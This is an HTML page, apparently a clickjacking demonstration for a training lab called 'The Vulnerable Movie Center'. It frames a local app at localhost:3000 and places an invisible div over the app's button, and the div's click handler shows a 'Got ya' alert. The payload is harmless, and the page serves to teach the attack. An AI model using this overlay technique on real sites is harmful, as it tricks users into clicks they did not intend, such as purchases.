<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Vulnerable Movie Center</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }

        /* invisible div */
        #overlay {
            position: absolute;
            top: 70%;
            left: 0;
            width: 3000px;
            height: 500px;
            background-color: rgba(255, 255, 255, 0);
            cursor: pointer;
            transform: translate(-50%, -50%);
        }
    </style>
</head>
<body>
<iframe src="http://localhost:3000"></iframe>

<!-- Invisible div, as an overlay above the clickable button -->
<div id="overlay" onclick="alert('Got ya - let me buy something for you')"></div>
</body>
</html>
